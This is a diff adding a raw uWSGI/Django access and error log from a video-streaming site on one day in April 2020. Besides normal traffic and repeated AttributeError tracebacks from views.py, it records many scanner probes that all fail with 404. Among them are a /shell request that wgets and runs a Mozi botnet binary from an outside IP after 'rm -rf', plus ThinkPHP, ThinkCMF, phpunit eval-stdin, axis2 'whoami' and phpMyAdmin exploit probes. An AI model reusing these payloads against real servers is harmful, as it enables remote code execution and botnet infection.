@@ -1,0 +1,154 @@
+[1586275201] ./uwsgi.log reopened.
+[pid: 10815|app: 0|req: 102/132] 113.69.34.155 () {42 vars in 919 bytes} [Wed Apr  8 00:05:46 2020] GET /video/admin/update_video/ => generated 28401 bytes in 3 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10815|app: 0|req: 103/133] 113.69.34.155 () {42 vars in 919 bytes} [Wed Apr  8 00:06:24 2020] GET /video/admin/update_video/ => generated 28401 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[pid: 10815|app: 0|req: 104/134] 58.247.212.239 () {36 vars in 555 bytes} [Wed Apr  8 01:37:31 2020] GET /admin/ => generated 0 bytes in 0 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 0)
+[pid: 10812|app: 0|req: 24/135] 58.247.212.239 () {38 vars in 618 bytes} [Wed Apr  8 01:37:31 2020] GET /admin/login.html => generated 5255 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[2020-04-08 01:53:57] [WARNING] Not Found: /
+[pid: 10812|app: 0|req: 25/136] 128.14.209.154 () {34 vars in 488 bytes} [Wed Apr  8 01:53:57 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 02:01:43] [ERROR] Internal Server Error: /video/i-play/
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./video/views.py", line 246, in i_play
+    if url.endswith('?src=search'):
+AttributeError: 'NoneType' object has no attribute 'endswith'
+[pid: 10812|app: 0|req: 26/137] 14.18.182.223 () {36 vars in 691 bytes} [Wed Apr  8 02:01:43 2020] GET /video/i-play/?url%3Dhttps://www.iqiyi.com/lib/m_206895314.html?src%3Dsearch => generated 145 bytes in 59 msecs (HTTP/1.1 500) 4 headers in 140 bytes (1 switches on core 1)
+[2020-04-08 02:01:55] [ERROR] Internal Server Error: /video/i-play/
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./video/views.py", line 246, in i_play
+    if url.endswith('?src=search'):
+AttributeError: 'NoneType' object has no attribute 'endswith'
+[pid: 10815|app: 0|req: 105/138] 101.89.19.140 () {36 vars in 691 bytes} [Wed Apr  8 02:01:55 2020] GET /video/i-play/?url%3Dhttps://www.iqiyi.com/lib/m_217508814.html?src%3Dsearch => generated 145 bytes in 2 msecs (HTTP/1.1 500) 4 headers in 140 bytes (1 switches on core 0)
+[pid: 10815|app: 0|req: 106/139] 101.89.19.140 () {36 vars in 611 bytes} [Wed Apr  8 02:03:28 2020] GET /video/type/2/?year%3D2017%26area%3D => generated 33942 bytes in 117 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10815|app: 0|req: 107/140] 182.254.52.17 () {36 vars in 554 bytes} [Wed Apr  8 02:07:15 2020] GET /video/ => generated 37108 bytes in 234 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
+[2020-04-08 02:17:02] [ERROR] Internal Server Error: /video/i-play/
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./video/views.py", line 246, in i_play
+    if url.endswith('?src=search'):
+AttributeError: 'NoneType' object has no attribute 'endswith'
+[pid: 10815|app: 0|req: 108/141] 14.18.182.223 () {36 vars in 713 bytes} [Wed Apr  8 02:17:02 2020] GET /video/i-play/?page%3D2%26url%3Dhttps://www.iqiyi.com/lib/m_217508814.html?src%3Dsearch => generated 145 bytes in 1 msecs (HTTP/1.1 500) 4 headers in 140 bytes (1 switches on core 0)
+[2020-04-08 02:20:33] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 109/142] 171.67.70.85 () {34 vars in 392 bytes} [Wed Apr  8 02:20:33 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 02:22:18] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 110/143] 92.62.104.135 () {32 vars in 463 bytes} [Wed Apr  8 02:22:18 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10815|app: 0|req: 111/144] 182.254.52.17 () {36 vars in 568 bytes} [Wed Apr  8 03:02:45 2020] GET /video/type/3/ => generated 32778 bytes in 81 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[pid: 10815|app: 0|req: 112/145] 101.89.19.140 () {36 vars in 574 bytes} [Wed Apr  8 03:09:35 2020] GET /admin/login.html => generated 5255 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 1)
+[2020-04-08 03:34:27] [ERROR] Internal Server Error: /video/i-play/
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./video/views.py", line 246, in i_play
+    if url.endswith('?src=search'):
+AttributeError: 'NoneType' object has no attribute 'endswith'
+[pid: 10815|app: 0|req: 113/146] 182.254.52.17 () {36 vars in 691 bytes} [Wed Apr  8 03:34:27 2020] GET /video/i-play/?url%3Dhttps://www.iqiyi.com/lib/m_200052614.html?src%3Dsearch => generated 145 bytes in 1 msecs (HTTP/1.1 500) 4 headers in 140 bytes (1 switches on core 0)
+[2020-04-08 04:03:16] [WARNING] Not Found: /solr/admin/info/system
+[pid: 10815|app: 0|req: 114/147] 5.101.0.209 () {34 vars in 553 bytes} [Wed Apr  8 04:03:16 2020] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 04:06:07] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 115/148] 5.101.0.209 () {34 vars in 553 bytes} [Wed Apr  8 04:06:07 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 04:06:07] [WARNING] Not Found: /
+[pid: 10812|app: 0|req: 27/149] 5.101.0.209 () {36 vars in 650 bytes} [Wed Apr  8 04:06:07 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 04:07:14] [WARNING] Not Found: /index.php
+[pid: 10815|app: 0|req: 116/150] 5.101.0.209 () {34 vars in 713 bytes} [Wed Apr  8 04:07:14 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 04:07:59] [WARNING] Not Found: /php
+[pid: 10815|app: 0|req: 117/151] 182.254.52.17 () {36 vars in 548 bytes} [Wed Apr  8 04:07:59 2020] GET /php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 04:53:37] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 118/152] 139.162.119.197 () {32 vars in 401 bytes} [Wed Apr  8 04:53:37 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 05:03:13] [WARNING] Not Found: /db
+[pid: 10815|app: 0|req: 119/153] 5.8.10.202 () {34 vars in 400 bytes} [Wed Apr  8 05:03:13 2020] GET /db => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10815|app: 0|req: 120/154] 14.18.182.223 () {36 vars in 520 bytes} [Wed Apr  8 05:18:27 2020] GET /admin/login.html => generated 5255 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
+[2020-04-08 05:55:55] [WARNING] Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 10815|app: 0|req: 121/155] 5.101.0.209 () {36 vars in 621 bytes} [Wed Apr  8 05:55:55 2020] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 06:12:19] [WARNING] Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[pid: 10815|app: 0|req: 122/156] 5.101.0.209 () {38 vars in 709 bytes} [Wed Apr  8 06:12:19 2020] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 06:20:21] [WARNING] Not Found: /ftmabc.php
+[pid: 10815|app: 0|req: 123/157] 58.247.212.239 () {36 vars in 563 bytes} [Wed Apr  8 06:20:21 2020] GET /ftmabc.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 07:37:13] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 124/158] 103.254.56.194 () {32 vars in 465 bytes} [Wed Apr  8 07:37:13 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 08:24:47] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 125/159] 34.214.205.4 () {34 vars in 498 bytes} [Wed Apr  8 08:24:47 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 08:51:42] [WARNING] Not Found: /Telerik.Web.UI.WebResource.axd
+[pid: 10815|app: 0|req: 126/160] 128.14.134.134 () {34 vars in 565 bytes} [Wed Apr  8 08:51:42 2020] GET /Telerik.Web.UI.WebResource.axd?type=rau => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 09:29:06] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 127/161] 183.136.225.57 () {34 vars in 455 bytes} [Wed Apr  8 09:29:06 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 09:39:51] [WARNING] Not Found: /TP/html/public/index.php
+[pid: 10815|app: 0|req: 128/162] 183.192.179.16 () {36 vars in 537 bytes} [Wed Apr  8 09:39:51 2020] GET /TP/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 09:53:35] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 129/163] 1.179.231.213 () {30 vars in 436 bytes} [Wed Apr  8 09:53:35 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 10:58:05] [WARNING] Not Found: /hudson
+[pid: 10815|app: 0|req: 130/164] 182.254.52.17 () {36 vars in 554 bytes} [Wed Apr  8 10:58:05 2020] GET /hudson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 12:12:12] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 131/165] 182.254.52.17 () {36 vars in 542 bytes} [Wed Apr  8 12:12:12 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[pid: 10815|app: 0|req: 132/166] 182.254.52.17 () {36 vars in 498 bytes} [Wed Apr  8 12:16:19 2020] GET /love/ => generated 8925 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 1)
+[2020-04-08 12:16:25] [WARNING] Not Found: /hudson
+[pid: 10812|app: 0|req: 28/167] 192.241.238.205 () {34 vars in 407 bytes} [Wed Apr  8 12:16:25 2020] GET /hudson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 12:43:30] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 133/168] 71.6.232.4 () {34 vars in 484 bytes} [Wed Apr  8 12:43:30 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 12:45:26] [WARNING] Not Found: /
+[pid: 10812|app: 0|req: 29/169] 31.150.65.190 () {30 vars in 436 bytes} [Wed Apr  8 12:45:26 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 12:53:24] [WARNING] Not Found: /
+[pid: 10812|app: 0|req: 30/170] 201.234.253.14 () {32 vars in 464 bytes} [Wed Apr  8 12:53:24 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 13:11:33] [WARNING] Not Found: /
+[pid: 10812|app: 0|req: 31/171] 62.4.14.206 () {34 vars in 516 bytes} [Wed Apr  8 13:11:33 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 13:52:43] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 134/172] 103.218.25.2 () {32 vars in 462 bytes} [Wed Apr  8 13:52:43 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 14:32:52] [WARNING] Not Found: /shell
+[pid: 10815|app: 0|req: 135/173] 117.90.85.130 () {34 vars in 648 bytes} [Wed Apr  8 14:32:52 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://117.90.85.130:41708/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10815|app: 0|req: 136/174] 182.254.52.17 () {36 vars in 592 bytes} [Wed Apr  8 16:22:19 2020] GET /video/play/51725/1-1.html => generated 15151 bytes in 8 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[2020-04-08 16:39:22] [WARNING] Not Found: /crd
+[pid: 10815|app: 0|req: 137/175] 14.18.182.223 () {36 vars in 548 bytes} [Wed Apr  8 16:39:22 2020] GET /crd => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 16:39:58] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 138/176] 192.241.237.8 () {34 vars in 393 bytes} [Wed Apr  8 16:39:58 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 16:49:16] [WARNING] Not Found: /axis2/services/Cat/exec
+[pid: 10815|app: 0|req: 139/177] 178.62.207.158 () {32 vars in 486 bytes} [Wed Apr  8 16:49:16 2020] GET /axis2/services/Cat/exec?cmd=whoami => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 19:07:53] [WARNING] Not Found: /cards
+[pid: 10815|app: 0|req: 140/178] 5.8.10.202 () {34 vars in 406 bytes} [Wed Apr  8 19:07:53 2020] GET /cards => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[pid: 10815|app: 0|req: 141/179] 113.69.34.155 () {42 vars in 919 bytes} [Wed Apr  8 21:01:03 2020] GET /video/admin/update_video/ => generated 28401 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
+[2020-04-08 21:40:54] [WARNING] Not Found: /w00tw00t.at.blackhats.romanian.anti-sec:)
+[pid: 10815|app: 0|req: 142/180] 62.171.172.225 () {38 vars in 521 bytes} [Wed Apr  8 21:40:54 2020] GET /w00tw00t.at.blackhats.romanian.anti-sec:) => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 21:40:55] [WARNING] Not Found: /phpMyAdmin/scripts/setup.php
+[pid: 10812|app: 0|req: 32/181] 62.171.172.225 () {38 vars in 495 bytes} [Wed Apr  8 21:40:55 2020] GET /phpMyAdmin/scripts/setup.php => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 21:40:57] [WARNING] Not Found: /phpmyadmin/scripts/setup.php
+[pid: 10814|app: 0|req: 4/182] 62.171.172.225 () {38 vars in 495 bytes} [Wed Apr  8 21:40:57 2020] GET /phpmyadmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 21:40:58] [WARNING] Not Found: /pma/scripts/setup.php
+[pid: 10813|app: 0|req: 5/183] 62.171.172.225 () {38 vars in 481 bytes} [Wed Apr  8 21:40:58 2020] GET /pma/scripts/setup.php => generated 179 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 21:40:59] [WARNING] Not Found: /myadmin/scripts/setup.php
+[pid: 10813|app: 0|req: 6/184] 62.171.172.225 () {38 vars in 489 bytes} [Wed Apr  8 21:40:59 2020] GET /myadmin/scripts/setup.php => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 21:41:00] [WARNING] Not Found: /MyAdmin/scripts/setup.php
+[pid: 10814|app: 0|req: 5/185] 62.171.172.225 () {38 vars in 489 bytes} [Wed Apr  8 21:41:00 2020] GET /MyAdmin/scripts/setup.php => generated 179 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 22:02:03] [WARNING] Not Found: /muieblackcat
+[pid: 10815|app: 0|req: 143/186] 69.10.61.250 () {36 vars in 438 bytes} [Wed Apr  8 22:02:03 2020] GET /muieblackcat => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 22:02:04] [WARNING] Not Found: /phpMyAdmin/scripts/setup.php
+[pid: 10813|app: 0|req: 7/187] 69.10.61.250 () {36 vars in 471 bytes} [Wed Apr  8 22:02:04 2020] GET //phpMyAdmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 22:02:08] [WARNING] Not Found: /phpmyadmin/scripts/setup.php
+[pid: 10814|app: 0|req: 6/188] 69.10.61.250 () {36 vars in 471 bytes} [Wed Apr  8 22:02:08 2020] GET //phpmyadmin/scripts/setup.php => generated 179 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 22:02:08] [WARNING] Not Found: /pma/scripts/setup.php
+[pid: 10812|app: 0|req: 33/189] 69.10.61.250 () {36 vars in 457 bytes} [Wed Apr  8 22:02:08 2020] GET //pma/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 22:02:09] [WARNING] Not Found: /myadmin/scripts/setup.php
+[pid: 10812|app: 0|req: 34/190] 69.10.61.250 () {36 vars in 465 bytes} [Wed Apr  8 22:02:09 2020] GET //myadmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 22:02:10] [WARNING] Not Found: /MyAdmin/scripts/setup.php
+[pid: 10814|app: 0|req: 7/191] 69.10.61.250 () {36 vars in 465 bytes} [Wed Apr  8 22:02:10 2020] GET //MyAdmin/scripts/setup.php => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
+[2020-04-08 22:02:14] [WARNING] Not Found: /PhpMyAdmin/scripts/setup.php
+[pid: 10815|app: 0|req: 144/192] 69.10.61.250 () {36 vars in 471 bytes} [Wed Apr  8 22:02:14 2020] GET //PhpMyAdmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[2020-04-08 22:06:29] [WARNING] Not Found: /
+[pid: 10815|app: 0|req: 145/193] 171.67.70.85 () {34 vars in 392 bytes} [Wed Apr  8 22:06:29 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
+[1586361602] logsize: 19600, triggering log-reopen...
